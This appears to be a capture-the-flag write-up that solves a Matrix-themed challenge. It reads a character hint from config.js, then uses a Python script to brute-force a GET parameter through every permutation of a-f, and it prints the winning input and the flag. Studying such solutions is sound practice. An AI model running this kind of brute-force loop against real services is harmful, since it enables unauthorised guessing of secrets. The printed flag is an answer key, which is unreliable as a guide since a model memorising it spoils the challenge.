## System Code

Much headache in this one due to the Matrix and Alice in Wonderland references priming your brain for all sorts of rabbit holes. We are given the hint, "follow **the white rabbit**" and explicitly told we can bruteforce this challenge. Probably wouldn't mention that unless it is necessary somehow. But in order to do so, you need to know some parameters. Otherwise it could take forever.

Digging around through the source code we find within `config.js` a variable that contains some chars.
```js
backupGlyphsTwr: ["a", "b", "c", "d", "e", "f"], // The characters to fallback to if glyphs fail to load
```
**Twr** - The white rabbit
Well lets try to brute this using permutations of a-f since they probably don't want us to guess the length of the string, and people solved this rather quickly.

We can script a brute force of the `/enter=` parameter the input box sends as GET request.
```python
import requests
import itertools

# USE YOUR PORT
base_url = 'http://challenge.ctf.games:PORT/enter='

characters = ['a', 'b', 'c', 'd', 'e', 'f']
permutations = [''.join(p) for p in itertools.permutations(characters)]

def send_request(permutation):
    print(f"Attempting: {permutation}")
    url = f"{base_url}{permutation}"
    try:
        response = requests.get(url)
        print(response.text)
        if "Correct" in response.text:
            return True
    except requests.RequestException as e:
        pass
    return False

for permutation in permutations:
    if send_request(permutation):
        break
```
This will run through the permutations and display the response, stopping if "Correct" is returned by the server. Eventually it will work and you will see:
```python
Attempting: bfcead
Incorrect. You will receive the flag with the correct input.
Attempting: bfceda
Incorrect. You will receive the flag with the correct input.
Attempting: bfdace
Incorrect. You will receive the flag with the correct input.
Attempting: bfdaec
Correct! Here is your flag: flag{dc9edf4624504202eec5d3fab10bbccd}
```
